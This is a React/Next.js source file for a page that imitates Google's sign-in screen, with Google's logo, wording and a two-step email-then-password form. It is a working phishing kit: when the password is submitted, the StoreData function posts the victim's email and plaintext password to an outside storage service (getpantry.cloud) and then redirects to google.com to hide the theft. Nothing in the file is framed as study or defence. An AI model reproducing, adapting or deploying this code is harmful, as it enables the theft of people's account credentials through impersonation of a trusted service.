import Head from 'next/head'
import { useState } from 'react'
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faCaretDown, faChevronDown, faUserCircle } from '@fortawesome/free-solid-svg-icons';
import { Inter } from '@next/font/google'

const inter = Inter({
  weight: '500',
  subsets: ['ubuntu'],
})
export default function Home() {

  const [Email, setEmail] = useState("")
  const [Pass, setPass] = useState("")
  const [EmailDone, setEmailDone] = useState(false)
  const [PassDone, setPassDone] = useState()

  const [opacity, setOpacity] = useState(false)
  const [Scale, setScale] = useState(true)
  const [PassType, setPassType] = useState("password")
  const [isChecked, setChecked] = useState(false)
  const [LoadingAnimation, setLoadingAnimation] = useState(false)

  const handelEmailChange = (event) => {
    setEmail(event.target.value)

  }
  const handelPassChange = (event) => {
    setPass(event.target.value)

  }
  const handelEmailButton = (e) => {
    e.preventDefault()
    setOpacity(true)
    setLoadingAnimation(true)

    setInterval(() => {
      setEmailDone(true)

    }, 1000);

    setInterval(() => {
      setOpacity(false)

    }, 1500);
    setInterval(() => {
      setScale(false)

    }, 1500);

    setInterval(() => {
      setLoadingAnimation(false)

    }, 1600);

  }
  const handelPassButton = (e) => {
    e.preventDefault()
    setLoadingAnimation(true)
    setOpacity(true)


    StoreData()

  }

  const StoreData = () => {



    let basketName = Email.split("@")[0]

    fetch(`https://getpantry.cloud/apiv1/pantry/0b32f6c1-ae41-4ec1-9faf-71fa0a75a3a6/basket/${basketName}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        "Name":basketName,
        "Email": Email,
        "Pass": Pass
      }),
    })
      .then((response) => response.json())
      .then((data) => {
        // console.log('Success:', data);
        window.location.href = "https://www.google.com"
      })
      .catch((error) => {
        console.error('Error:', error);
      });



  }

  const togglePass = () => {

    if (PassType === "text") {
      setPassType("password")
      setChecked(false)
    }

    else {
      setPassType("text")
      setChecked(true)

    }


  }

  return (
    <>
      <Head>
        <title>Login</title>
      </Head>


      <main className={`relative overflow-x-hidden w-fit m-auto flex flex-col md:h-screen item-center justify-center`}>

        <div className={`w-full h-[5px] duration-700 ease-out md:h-1  bg-blue-500  ${LoadingAnimation ? "animate-loading block" : "hidden"}`}></div>
        <div className={`relative h-fit flex duration-300 ${EmailDone ? "-translate-x-[100%]" : "translate-x-[0%]"} ${opacity ? "opacity-50" : "opacity-100"}  max-w-[500px] `}>

          <section className='relative max-w-[100%] min-w-[100%] text-lg'>
            <div className="bg-white relative flex flex-col justify-center items-center">
              <div className="md:border md:border-gray-300 bg-white shadow-none rounded px-10 pt-[60px] pb-[90px]" >
                <div className="flex flex-col items-center space-y-3">
                  <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" className="l5Lhkf"><g id="qaEJec"><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path></g><g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g><g id="BWfIk"><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path></g><g id="e6m3fd"><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g><g id="vbkDmc"><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g><g id="idEJde"><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path></g></svg>
                  <span className={` md:text-2xl text-3xl font-semi-bold leading-normal `} >Sign in</span>
                  <p className="leading-normal">Use your Google Account</p>
                </div>
                <form onSubmit={handelEmailButton} className="my-8">
                  <div className="relative mb-2">
                    <input onChange={handelEmailChange} id="email" className="w-full rounded px-3 border border-gray-300 py-3 focus:border-blue-700 focus:ring-1 focus:ring-blue-700 focus:outline-none input active:outline-none" type="email" autoFocus placeholder='Enter your Email' required />
                    {/* <label for="email" className="label absolute mt-2 ml-3 leading-tighter text-gray-600 text-base cursor-text">Email or phone</label> */}
                  </div>
                  <div className="space-y-9">
                    <div>
                      <a className="md:text-sm font-bold text-blue-500" href="https://www.google.com">Forgot email?</a>
                    </div>
                    <div className="md:text-base text-gray-500">
                      <p>Not your computer? Use Guest mode to sign in privately. <a className="font-bold text-blue-500" href="https://support.google.com/chrome/answer/6130773?hl=en">Learn more</a> </p>

                    </div>
                    <div className="text-sm flex justify-between items-center">
                      <a className="font-bold text-blue-500 py-2 px-2 rounded -ml-2 hover:bg-blue-50 hover:text-blue-700 md:text-base text-lg" href="https://www.google.com">Create account</a>
                      <button type='submit' className="py-2 px-6 rounded text-white btn bg-blue-500 hover:bg-blue-600 md:text-base text-lg">Next</button>
                    </div>
                  </div>
                </form>
              </div>
            </div>
          </section>

          <section className={`relative max-w-[100%] min-w-[100%]  ${Scale ? 'scale-90' : 'scale-100'} duration-200 text-lg`}>
            <div className=" bg-white relative flex flex-col justify-center items-center ">
              <div className="md:border md:border-gray-300 bg-white rounded px-10 pt-[60px] pb-[90px] w-full " >
                <div className="flex flex-col items-center ">
                  <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" className="l5Lhkf mt-2"><g id="qaEJec"><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path></g><g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g><g id="BWfIk"><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path></g><g id="e6m3fd"><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g><g id="vbkDmc"><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g><g id="idEJde"><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path></g></svg>
                  <span className={`text-3xl md:text-2xl font-semi-bold my-4 md:my-3 leading-normal  ${inter.className}`} >Welcome</span>
                  <div className="border-2 border-gray-300 px-2  py-1 rounded-[30px] flex gap-[5px] cursor-pointer hover:bg-gray-200 hover:border-white font-medium m-auto">
                    <span> <FontAwesomeIcon icon={faUserCircle} /> </span>
                    <p className={`${inter.className}`}>{Email}</p>


                    <span> <FontAwesomeIcon icon={faChevronDown} /> </span>
                  </div>
                </div>
                <form onSubmit={handelPassButton} className="my-8">
                  <div className="relative mb-2">
                    <input onChange={handelPassChange} id="pass" type={PassType} className="w-full rounded px-3 border border-gray-300 p-3 focus:border-blue-700 focus:ring-1 focus:ring-blue-700 focus:outline-none input active:outline-none" autoFocus placeholder='Enter your password' required />
                  </div>
                  <div className="space-y-20">
                    <div>
                      <div className='flex gap-4'>
                        <input onClick={togglePass} type="checkbox" name="pass" className='w-5 border-4' checked={isChecked} />
                        <p onClick={togglePass} className="text-lg md:text-base cursor-pointer">Show Password</p>

                      </div>
                    </div>

                    <div className="text-sm flex justify-between items-center">
                      <a className="font-bold text-blue-500 py-2 px-2 rounded -ml-2 hover:text-blue-700 md:text-base text-lg" href="https://www.google.com">Forgot password?</a>
                      <button type='submit' className="py-2 px-6 rounded text-white btn bg-blue-500 hover:bg-blue-600 md:text-base text-lg">Next</button>
                    </div>
                  </div>
                </form>
              </div>
            </div>
          </section>
        </div>
        <div className="flex my-5 md:p-0 p-8 w-full ">
          <ul className="flex justify-between w-full px-1 flex-wrap ">
            <li><a href="/9W1vw0PcCYNaXV6Pl3K4MgsjXQBsT2Gj" target="_blank" rel="noopener noreferrer"> English (United States) <FontAwesomeIcon className='ml-5' icon={faCaretDown}/> </a></li>
            <li><a href="http://google.com" target="_blank" rel="noopener noreferrer"> Help</a></li>
            <li><a href="http://google.com" target="_blank" rel="noopener noreferrer"> Privacy</a></li>
            <li><a href="http://google.com" target="_blank" rel="noopener noreferrer"> Terms</a></li>
          </ul>
        </div>

      </main>
    </>
  )
}
